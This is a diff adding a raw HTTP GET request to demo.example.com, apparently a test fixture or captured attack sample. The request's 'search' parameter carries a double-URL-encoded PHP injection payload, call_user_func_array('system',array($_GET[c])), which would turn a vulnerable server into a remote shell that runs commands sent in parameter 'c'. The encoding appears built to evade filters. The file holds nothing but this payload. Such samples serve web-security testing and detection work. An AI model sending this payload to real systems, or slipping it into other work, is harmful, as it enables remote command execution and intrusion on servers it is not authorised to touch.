@@ -1,0 +1,4 @@
+GET /a?search=call_user_func_array%2528%2527system%2527%252Carray%2528%2524_GET%255Bc%255D%2529%2529 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
